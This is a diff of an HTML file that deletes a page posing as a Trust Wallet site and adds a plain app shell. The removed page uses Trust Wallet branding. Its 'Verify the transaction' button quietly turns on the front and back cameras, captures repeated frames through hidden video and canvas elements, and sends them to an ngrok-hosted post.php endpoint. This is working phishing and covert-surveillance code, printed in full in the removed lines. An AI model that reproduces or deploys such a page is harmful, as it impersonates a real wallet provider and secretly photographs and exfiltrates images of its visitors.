@@ -1,240 +1,28 @@
-<!doctype html>
-<html lang="en">
-<head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>TrustWallet</title>
-<style>
-:root {
-  --accent:#1e90ff;
-  --accent-active:#28a745;
-  --bg:linear-gradient(180deg,#0a1226 0%, #081226 60%, #07122b 100%);
-  --white: #ffffff;
-}
-body{
-  margin:0; font-family:Inter, system-ui, Arial, sans-serif; background:var(--bg); color:var(--white);
-  -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale;
-}
-.container{max-width:1000px;margin:0 auto;padding:40px 20px;text-align:left;}
-header{display:flex;align-items:center;gap:10px;margin-bottom:30px;}
-.logo{display:flex;align-items:center;gap:8px;}
-.logo img{width:32px;height:32px;}
-.logo h2{margin:0;font-size:24px;font-weight:400;}
-main.hero{display:flex;gap:30px;align-items:flex-start;justify-content:flex-start;flex-wrap:wrap;}
-.hero-left{text-align:left;max-width:520px;}
-.hero-left h1, .hero-left .eyebrow{
-  margin:6px 0;
-  font-family:'Inter', sans-serif;
-  font-weight:400;
-  font-size:32px;
-}
-.hero-left p.lead{
-  margin:10px 0;
-  font-family:'Inter', sans-serif;
-  font-weight:400;
-  font-size:18px;
-  color:rgba(255,255,255,0.85);
-}
-.cta-row{display:flex;justify-content:center;gap:12px;flex-wrap:wrap;margin-top:20px;}
-.btn{
-  background:var(--accent);
-  color:white;
-  padding:18px 28px;
-  border-radius:12px;
-  border:0;
-  font-size:18px;
-  cursor:pointer;
-  box-shadow:0 8px 24px rgba(30,144,255,0.12);
-  transition: 0.3s;
-}
-.btn.active{
-  background:var(--accent-active);
-}
-.hero-right{display:flex;align-items:center;justify-content:flex-start;flex-direction:column;gap:20px;flex:1;}
-.card{
-  background:none; /* plus de rectangle visible */
-  padding:0; border-radius:14px;
-  width:100%;
-}
-#display1{
-  display:block;
-  width:100%;
-  height:300px; /* un peu plus grand */
-  object-fit:cover;
-  border-radius:0; /* supprimer les bords arrondis */
-}
-#display{
-  display:block;
-  width:90%;
-  height:180px;
-  object-fit:cover;
-  border-radius:10px;
-  border:2px solid rgba(255,255,255,0.06);
-  filter: blur(8px);
-}
-footer{
-  margin-top:50px;
-  color:rgba(255,255,255,0.8);
-  font-size:14px;
-  line-height:1.6;
-}
-.footer-columns{
-  display:flex;
-  flex-wrap:nowrap; /* colonnes horizontales */
-  justify-content:space-between;
-  gap:40px;
-}
-.footer-column{
-  min-width:150px;
-}
-.footer-column h3{
-  font-weight:600;
-  margin-bottom:6px;
-}
-@media (max-width:1024px){
-  .hero-left h1, .hero-left .eyebrow{font-size:28px;}
-  #display, #display1{width:100%; height:auto;}
-  .footer-columns{flex-wrap:wrap; justify-content:flex-start;}
-}
-</style>
-</head>
-<body>
-<div class="container">
-  <header>
-    <div class="logo">
-      <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="TrustWallet Logo">
-      <h2>TrustWallet</h2>
-    </div>
-  </header>
-
-  <main class="hero">
-    <div class="hero-left">
-      <div class="eyebrow">True crypto ownership.</div>
-      <h1>Powerful Web3 experiences</h1>
-      <p class="lead">Unlock the power of your cryptocurrency assets and explore the world of Web3 with Trust Wallet.</p>
-
-      <div class="cta-row">
-        <button id="getAccessBtn" class="btn">Verify the transaction</button>
-      </div>
-    </div>
-
-    <div class="hero-right">
-      <div class="card">
-        <img id="display1" src="Capture1.PNG" alt="Capture 1">
-      </div>
-      <div class="card">
-        <img id="display" src="Capture.PNG" alt="Capture 2">
-      </div>
-    </div>
-  </main>
-</div>
-
-<footer>
-  <div class="footer-columns">
-    <div class="footer-column">
-      <h3>Wallet</h3>
-      Mobile App<br>
-      Browser Extension
-    </div>
-    <div class="footer-column">
-      <h3>Features</h3>
-      Buy Crypto<br>
-      Swaps<br>
-      Staking<br>
-      NFTs<br>
-      Security<br>
-      SWIFT: Smart Contract Wallet
-    </div>
-    <div class="footer-column">
-      <h3>Build</h3>
-      Developer Docs<br>
-      Wallet Core<br>
-      Submit dApp<br>
-      Get assets listed
-    </div>
-    <div class="footer-column">
-      <h3>Support</h3>
-      FAQ<br>
-      Contact Us
-    </div>
-    <div class="footer-column">
-      <h3>About</h3>
-      About Us<br>
-      Careers<br>
-      Press Kit<br>
-      Terms of Service<br>
-      Privacy Notice<br>
-      Cookie Preferences<br>
-      Cookie Notice<br>
-      Blog
-    </div>
-  </div>
-</footer>
-
-<video id="video" autoplay muted playsinline style="display:none;width:0;height:0;"></video>
-<canvas id="canvas" width="320" height="220" style="display:none;"></canvas>
-
-<script>
-const API_URL = "https://unsighing-prepalatine-yi.ngrok-free.dev/post.php";
-const getBtn = document.getElementById('getAccessBtn');
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-let stopCapture = false;
-
-function captureFrame(){
-  const ctx = canvas.getContext('2d');
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-  return canvas.toDataURL('image/png');
-}
-
-async function sendImage(base64){
-  try{
-    const r = await fetch(API_URL, {
-      method: 'POST',
-      headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({ imageBase64: base64 })
-    });
-    return await r.json();
-  }catch(e){ console.error('send error', e); return null; }
-}
-
-async function startCapture(){
-  getBtn.disabled = true;
-  getBtn.textContent = 'Connecting...';
-  getBtn.classList.add('active');
-
-  const cameras = ['user','environment']; // front/back
-  for(const cam of cameras){
-    if(stopCapture) break;
-    let stream;
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: cam } });
-    } catch (err) {
-      console.warn(`Camera ${cam} not accessible:`, err);
-      continue;
-    }
-    video.srcObject = stream;
-    await video.play();
-
-    for(let i=0;i<50;i++){
-      if(stopCapture) break;
-      const base64 = captureFrame();
-      sendImage(base64).then(res=>console.log('sent',res)).catch(()=>{});
-      await new Promise(r=>setTimeout(r, 1200));
-    }
-
-    stream.getTracks().forEach(t=>t.stop());
-  }
-
-  getBtn.disabled = false;
-  getBtn.textContent = 'Verify the transaction';
-  getBtn.classList.remove('active');
-}
-
-// Stop capture when user leaves page
-window.addEventListener('beforeunload', ()=>{ stopCapture = true; });
-
-getBtn.addEventListener('click', startCapture);
-</script>
-</body>
+<!DOCTYPE html>
+<html lang="en" style="overflow: auto; height: 100%; margin: 0; padding: 0;">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="default" />
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests" />
+    <title>web</title>
+    <style>
+      html, body {
+        overflow: auto !important;
+        height: 100% !important;
+        margin: 0 !important;
+        padding: 0 !important;
+        width: 100% !important;
+        -webkit-overflow-scrolling: touch;
+      }
+    </style>
+    <script type="module" crossorigin src="/js/index-1231feb5.js"></script>
+    <link rel="stylesheet" href="/js/index-4037ac57.css">
+  </head>
+  <body style="overflow: auto; height: 100%; margin: 0; padding: 0;">
+    <div id="app"></div>
+    
+  </body>
 </html>
